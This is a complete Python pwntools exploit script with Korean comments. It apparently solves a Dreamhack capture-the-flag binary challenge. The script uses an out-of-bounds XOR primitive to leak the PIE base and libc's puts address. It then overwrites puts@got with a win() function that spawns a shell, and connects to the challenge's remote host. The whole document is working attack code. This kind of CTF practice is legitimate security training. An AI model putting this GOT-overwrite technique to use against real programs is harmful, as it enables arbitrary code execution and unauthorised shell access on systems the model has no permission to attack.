#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./main')
# context.log_level = 'debug'

# ── 바이너리 상대 오프셋 (objdump 로 확인) ──────────────
ARR      = 0x34c0          # uint64_t arr[64]
PUTS_GOT = 0x3428          # 덮을 대상: print_menu() 가 매 루프 첫 줄에서 호출
WIN      = 0x13ed          # win() = system("/bin/sh")
RELA     = 0x3210          # R_X86_64_RELATIVE -> 런타임 값 = base + 0x11e0
RELA_VAL = 0x11e0

# arr 기준 8바이트 인덱스 (음수 = OOB, xor()의 i,j 는 signed int 라 가능)
idx = lambda off: (off - ARR) // 8
PUTS_IDX = idx(PUTS_GOT)   # -19
RELA_IDX = idx(RELA)       # -87
SCRATCH  = 63              # 주소는 48비트 미만 -> basis 비트 63 은 안 쓰이므로 스크래치로 전용

p = remote('host3.dreamhack.games', 15334)

def menu(op):
    p.sendlineafter(b'> ', str(op).encode())

def xor(i, j):                     # arr[i] ^= arr[j]
    menu(1)
    p.sendlineafter(b'> ', f'{i} {j}'.encode())

def read(i):                       # return arr[i]  (i 는 uint32, in-bounds 만 안전)
    menu(2)
    p.sendlineafter(b'> ', str(i).encode())
    p.recvuntil(b'Value: ')
    return int(p.recvline().strip(), 16)

def pull_leak(slot, oob_idx):
    """arr[slot] ^= arr[oob_idx] 로 OOB 값을 in-bounds 로 당겨 읽고, 원상복구 후 원래 값 반환"""
    base_val = read(slot)          # 손대기 전 현재 값 (basis 라면 1<<slot)
    xor(slot, oob_idx)
    mixed = read(slot)             # base_val ^ (target)
    xor(slot, oob_idx)             # 복구 (XOR 가역)
    return base_val ^ mixed

# ── 1단계: PIE base leak (lazy binding 무관한 RELATIVE 슬롯 사용) ──
pie = pull_leak(0, RELA_IDX) - RELA_VAL
assert pie & 0xfff == 0, f"base leak 실패: {hex(pie)}"
win_addr = pie + WIN
log.success(f"PIE base : {hex(pie)}")
log.success(f"win()    : {hex(win_addr)}")

# ── 2단계: 현재 puts@got (libc puts) leak ──
libc_puts = pull_leak(1, PUTS_IDX)
log.success(f"libc puts: {hex(libc_puts)}")

# ── 3단계: delta = libc_puts XOR win 을 스크래치(arr[63])에 조립 ──
#  이 동안 puts@got 는 건드리지 않으므로 print_menu 의 puts 는 안전
delta = libc_puts ^ win_addr
xor(SCRATCH, SCRATCH)              # arr[63] = 0
for b in range(delta.bit_length()):
    if (delta >> b) & 1:
        assert b != SCRATCH, "스크래치 비트 충돌"
        xor(SCRATCH, b)            # arr[63] ^= (1<<b)  (basis 보존)

# ── 4단계: 단발성 덮기 -> 다음 print_menu 의 puts() -> win() -> shell ──
xor(PUTS_IDX, SCRATCH)             # puts@got = libc_puts ^ delta = win

p.interactive()
